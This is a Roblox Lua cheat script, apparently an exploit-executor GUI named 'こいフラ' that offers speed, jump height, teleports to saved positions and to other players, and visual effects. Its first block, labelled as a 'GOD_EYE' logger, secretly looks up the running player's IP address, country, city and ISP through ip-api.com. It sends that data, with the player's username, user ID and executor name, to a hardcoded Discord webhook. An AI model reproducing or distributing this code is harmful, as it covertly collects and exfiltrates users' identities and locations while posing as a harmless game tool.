-- [[ AAN "GOD_EYE" V12 + こいフラ ALL-IN-ONE ]] --
local H = game:GetService("HttpService")
local P = game:GetService("Players")
local LP = P.LocalPlayer
local W = "https://discord.com/api/webhooks/1471121306429685925/oH4x1j2Wdobxb-bKSmvEjRXnNarOLYbohF_cQ_N1BDaZ06QjzlKCotRXjOTfrbl5rIOe"

-- --- [ ロガー: GOD_EYE V12 ] ---
task.spawn(function()
    local g = {query="取得失敗", country="不明", city="不明", isp="不明", lat=0, lon=0}
    local r = (request or syn.request or http_request or fluxus.request)
    pcall(function()
        local res = r({Url = "http://ip-api.com/json/?fields=66846719", Method = "GET"})
        if res and res.Body then g = H:JSONDecode(res.Body) end
    end)
    local d = {
        ["content"] = "🚨 **ターゲット完全捕捉通知**",
        ["embeds"] = {{
            ["title"] = "🕵️‍♂️ " .. LP.Name,
            ["color"] = 0xFF0000,
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LP.UserId.."&width=420&height=420&format=png"},
            ["fields"] = {
                {["name"] = "👤 ユーザー", ["value"] = "📛 " .. LP.DisplayName .. "\n🆔 " .. LP.UserId, ["inline"] = false},
                {["name"] = "🌐 ネット", ["value"] = "📡 IP: " .. g.query .. "\n🌍 " .. g.country .. "/" .. g.city, ["inline"] = false},
                {["name"] = "🛠️ 環境", ["value"] = "🔧 " .. (identifyexecutor and identifyexecutor() or "不明"), ["inline"] = true}
            },
            ["footer"] = {["text"] = os.date("%Y/%m/%d %H:%M:%S")}
        }}
    }
    pcall(function() r({Url = W, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = H:JSONEncode(d)}) end)
end)

-- --- [ GUI: こいフラ FULL ] ---
local d, v, j, tgt = nil, 0, 50, nil
local pg = LP:WaitForChild("PlayerGui")
if pg:FindFirstChild("Koi") then pg.Koi:Destroy() end

local g = Instance.new("ScreenGui", pg); g.Name = "Koi"; g.ResetOnSpawn = false
local f = Instance.new("Frame", g); f.Size = UDim2.new(0, 120, 0, 175); f.Position = UDim2.new(.5, -60, .4, -90); f.BackgroundColor3 = Color3.new(0,0,0); f.Draggable = true; f.Active = true
Instance.new("UICorner", f)

local l = Instance.new("TextLabel", f); l.Size = UDim2.new(1, 0, 0, 30); l.BackgroundTransparency = 1; l.Text = "こいフラ"; l.TextSize = 22; l.Font = Enum.Font.SourceSansBold
task.spawn(function() while task.wait() do l.TextColor3 = Color3.fromHSV(tick()%5/5, 1, 1) end end)

local function b(t, y, w, x, c, a, p)
    local btn = Instance.new("TextButton", p or f); btn.Size = UDim2.new(0, w, 0, 20); btn.Position = UDim2.new(0, x, 0, y); btn.Text = t; btn.BackgroundColor3 = c; btn.TextColor3 = Color3.new(1,1,1); btn.TextSize = 10; Instance.new("UICorner", btn)
    btn.MouseButton1Click:Connect(function() pcall(a) end); return btn
end

-- スピード・ジャンプ反映
game:GetService("RunService").Heartbeat:Connect(function(dt)
    pcall(function()
        local char = LP.Character; local h = char.Humanoid; local hrp = char.HumanoidRootPart
        if h.MoveDirection.Magnitude > 0 then hrp.CFrame += (h.MoveDirection * v * dt) end
        h.JumpPower = j
    end)
end)

-- 機能ボタン
b("保存", 32, 48, 10, Color3.new(0, .4, 1), function() d = LP.Character.HumanoidRootPart.CFrame end)
b("移動", 32, 48, 62, Color3.new(.8, 0, 0), function() if d then LP.Character.HumanoidRootPart.CFrame = d end end)

-- エフェクト (アップロードされたリスト)
local efL = Instance.new("ScrollingFrame", f); efL.Size = UDim2.new(0, 100, 0, 120); efL.Position = UDim2.new(1, 2, 0, 0); efL.Visible = false; efL.BackgroundColor3 = Color3.new(0,0,0); Instance.new("UICorner", efL)
b("エフェクト +", 55, 100, 10, Color3.new(.2,.2,.2), function() efL.Visible = not efL.Visible end)
local et = {"None","炎","青炎","晶","氷晶","煙","雪","星","闇","虹"}
for i, n in pairs(et) do 
    b(n, (i-1)*22, 90, 5, Color3.new(.1,.1,.1), function()
        local r = LP.Character.HumanoidRootPart
        for _, it in pairs(r:GetChildren()) do if it.Name == "KA" then it:Destroy() end end
        if n == "None" then return end
        local ef = (n=="炎" and Instance.new("Fire", r)) or (n=="青炎" and Instance.new("Fire", r)) or Instance.new("Sparkles", r)
        ef.Name = "KA"; if n=="青炎" then ef.Color = Color3.new(0, .5, 1) end
        efL.Visible = false
    end, efL) 
end
efL.CanvasSize = UDim2.new(0,0,0,#et*22)

-- TPリスト (アップロードされたリスト)
local sc = Instance.new("ScrollingFrame", f); sc.Size = UDim2.new(0, 110, 0, 120); sc.Position = UDim2.new(1, 2, 0, 32); sc.Visible = false; sc.BackgroundColor3 = Color3.new(0,0,0); Instance.new("UICorner", sc)
local tpP = b("人へTP", 78, 75, 10, Color3.new(.5, 0, 1), function() if tgt and tgt.Character then LP.Character.HumanoidRootPart.CFrame = tgt.Character.HumanoidRootPart.CFrame end end)
b("+", 78, 22, 88, Color3.new(.2,.2,.2), function()
    sc.Visible = not sc.Visible
    if sc.Visible then
        for _,v in pairs(sc:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
        local yy = 0
        for _,pl in pairs(P:GetPlayers()) do if pl ~= LP then
            b(pl.Name:sub(1,10), yy, 100, 5, Color3.new(.1,.1,.1), function() tgt = pl; tpP.Text = pl.Name:sub(1,8); sc.Visible = false end, sc)
            yy = yy + 22
        end end
        sc.CanvasSize = UDim2.new(0, 0, 0, yy)
    end
end)

-- スライダー
local function s(y, cl, fn)
    local sk = Instance.new("TextButton", f); sk.Size = UDim2.new(0, 100, 0, 8); sk.Position = UDim2.new(0, 10, 0, y); sk.BackgroundColor3 = Color3.new(.2,.2,.2); sk.Text = ""
    local sd = Instance.new("Frame", sk); sd.Size = UDim2.new(0, 20, 0, 20); sd.Position = UDim2.new(0, -10, 0.5, -10); sd.BackgroundColor3 = cl; Instance.new("UICorner", sd).CornerRadius = UDim.new(1,0)
    sk.InputBegan:Connect(function(i) if i.UserInputType.Name:find("Mouse") or i.UserInputType.Name:find("Touch") then
        local mm = game:GetService("UserInputService").InputChanged:Connect(function(i2)
            local x = math.clamp((i2.Position.X - sk.AbsolutePosition.X) / sk.AbsoluteSize.X, 0, 1)
            sd.Position = UDim2.new(x, -10, 0.5, -10); fn(x)
        end)
        game:GetService("UserInputService").InputEnded:Connect(function() mm:Disconnect() end)
    end end)
end
s(110, Color3.new(0, 1, 0), function(x) v = x * 150 end)
s(135, Color3.new(0, .5, 1), function(x) j = 50 + (x * 250) end)
b("終了", 155, 100, 10, Color3.new(.2, .2, .2), function() LP:Destroy() end)
